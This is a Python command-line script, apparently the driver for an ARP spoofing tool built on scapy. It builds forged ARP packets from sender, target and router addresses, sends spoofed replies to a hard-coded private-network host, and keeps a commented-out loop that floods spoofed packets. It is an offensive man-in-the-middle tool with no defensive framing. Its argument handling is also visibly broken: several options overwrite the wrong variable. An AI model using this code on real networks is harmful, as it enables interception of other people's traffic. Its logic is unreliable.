from scapy.all import * 
from scapy.layers.l2 import ARP, Ether
from json import dumps
from argparse import ArgumentParser
from logging import getLogger, basicConfig, DEBUG, WARNING

from arpSpoofer import ARPSpoofer

# Create the ARP request packet


# Send the ARP request packet every 1 seconds
# packets = []
# packets.append(arp_request_client)
# packets.append(arp_request_router)
# print(packets)
# while True:
#     [sendp(x,verbose=False) for x in packets]
#     # sendp(arp_request_client, verbose=False)
#     # sendp(arp_request_router, verbose=False)
#     time.sleep(0.1)

# arp_result = arp_scan('172.16.5.0/24')
# print(dumps(arp_result,indent=4))

def assignMac(mac_address):
    return mac_address.replace(":", ".")
    

if __name__ == "__main__":

    arp = ARPSpoofer()

    ap = ArgumentParser()
    # Adding arguments
    ap.add_argument('--sender_mac', type=str, help='Sender MAC address')
    ap.add_argument('--sender_ip', type=str, help='Sender IP address 1')
    ap.add_argument('--target_mac', type=str, default="1a:f8:aa:87:43:41", help='Target MAC address 1')
    ap.add_argument('--target_ip', type=str, default="172.16.7.92", help='Target IP address 1')
    ap.add_argument('--router_mac', type=str, help='Target MAC address 2 (Router)')
    ap.add_argument('--router_ip', type=str, help='Sender IP address 2 (Router)')

    ap.add_argument('ip_addresses',
                    nargs='*',
                    help='one or more ipaddresses to spoof MAC for')
    ap.add_argument('-s',
                    '--scan',
                    action='store_true',
                    help='scan local network for ip-mac mapping')
    ap.add_argument('-d',
                    '--debug',
                    action='store_true',
                    help='enable debug logging')
    ap.add_argument('--status',
                    action='store_true',
                    help='check network status and info')
    args = ap.parse_args()
    print(args)
    
    arp_request_client = Ether(dst=args.target_mac, src=args.sender_mac) / \
                    ARP(pdst=args.target_ip, psrc=args.sender_ip)

    arp_request_router = Ether(dst=args.router_mac, src=args.sender_mac) / \
                    ARP(pdst=args.router_ip, psrc=args.sender_ip)

    # Configuration
    status = arp.report_net_status()
    sender_ip = status['host_ip']
    sender_mac = status['host_mac']
    router_ip = status['gateway_ip']
    router_mac = status['gateway_mac']
    
    if args.sender_ip:
        sender_ip = args.sender_ip
    if args.sender_mac:
        sender_ip = assignMac(args.sender_mac)
    if args.router_ip:
        sender_ip = args.router_ip
    if args.router_mac:
        sender_ip = assignMac(args.router_mac)
    
    
    if args.status:
        print(dumps(status, indent=4))

    if args.debug:
        basicConfig(level=DEBUG)
    else:
        basicConfig(level=WARNING)

    if args.scan:
        arp.scan_network()

    target_ip = "172.16.7.223"
    target_mac = assignMac("06:d2:f9:3f:b1:67")

    arp.spoof_mac(target_ip, spoof_source=False)
    # for ip in args.ip_addresses:
    #     try:
    #         arp.spoof_mac(ip, spoof_source=True)
    #     except:
    #         logger.exception(f'Exception occured for ip address: {ip}')
    #         continue


# Notes: make use of ARP status for all sender and router ip and mac addresses, unless provided in args